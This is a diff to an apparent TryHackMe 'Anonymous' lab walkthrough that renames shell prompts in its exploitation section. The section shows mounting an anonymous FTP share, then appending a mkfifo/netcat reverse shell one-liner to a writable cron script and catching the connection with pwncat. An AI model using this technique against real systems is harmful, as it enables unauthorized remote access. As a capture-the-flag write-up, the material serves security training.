@@ -153,28 +153,28 @@ Let's move on to Exploitation part.
 
 ### Exploitation
 ```bash
-silver@parrot  ~/Desktop/tryhackme/anonymous/nmap  curlftpfs anonymous:anon@10.10.74.228 /home/silver/Desktop/tryhackme/anonymous/nmap/my_ftp
+root@parrot  ~/Desktop/tryhackme/anonymous/nmap  curlftpfs anonymous:anon@10.10.74.228 /home/silver/Desktop/tryhackme/anonymous/nmap/my_ftp
  silver@parrot  ~/Desktop/tryhackme/anonymous/nmap  lks
 zsh: correct 'lks' to 'ls' [nyae]? y
 my_ftp  pickhill.gnmap  pickhill.nmap  pickhill.xml
- silver@parrot  ~/Desktop/tryhackme/anonymous/nmap  cd my_ftp
+ root@parrot  ~/Desktop/tryhackme/anonymous/nmap  cd my_ftp
 ls                                                               
- silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp  ls
+ root@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp  ls
 scripts
- silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp  ls -la
+ root@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp  ls -la
 total 4
 drwxr-xr-x 1 root   root   1024 Jan  1  1970 .
 drwxr-xr-x 1 silver silver   90 Aug 26 11:15 ..
 drwxrwxrwx 2 root   root   4096 Jun  4 19:26 scripts
  silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp  cd scripts
- silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp/scripts  ls -la
+ root@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp/scripts  ls -la
 total 16
 drwxrwxrwx 2 root root 4096 Jun  4 19:26 .
 drwxr-xr-x 1 root root 1024 Jan  1  1970 ..
 -rwxr-xrwx 1 root root  314 Jun  4 19:24 clean.sh
 -rw-rw-r-- 1 root root 2580 Aug 26 05:47 removed_files.log
 -rw-r--r-- 1 root root   68 May 12 03:50 to_do.txt
- silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp/scripts  cat clean.sh
+ root@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp/scripts  cat clean.sh
 #!/bin/bash
 
 tmp_files=0
@@ -186,7 +186,7 @@ else
     for LINE in $tmp_files; do
         rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
 fi
- silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp/scripts  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.124.57 4444 >/tmp/f" >> clean.sh
+ root@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp/scripts  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.124.57 4444 >/tmp/f" >> clean.sh
 zsh: operation not supported: clean.sh
  ✘ silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp/scripts  ls -la
 total 16
@@ -196,12 +196,12 @@ drwxr-xr-x 1 root root 1024 Jan  1  1970 ..
 -rw-rw-r-- 1 root root 2709 Aug 26 05:50 removed_files.log
 -rw-r--r-- 1 root root   68 May 12 03:50 to_do.txt
 nano clean.sh                                                                                                                        
- silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp/scripts  nano clean.sh
- silver@parrot  ~/Desktop/tryhackme/ano
+ root@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp/scripts  nano clean.sh
+ root@parrot  ~/Desktop/tryhackme/ano
 
 Here we go our reverse shell:-
 
- silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp/scripts  pwncat --listen --port 4444
+ root@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp/scripts  pwncat --listen --port 4444
 [11:44:44] received connection from 10.10.74.228:44016                                                                 connect.py:148
 [11:44:47] new host w/ hash 9bc647e33bc8a15fe1850dcd4a2752c1                                                            victim.py:329
 [11:45:05] pwncat running in /bin/sh                                                                                    victim.py:363
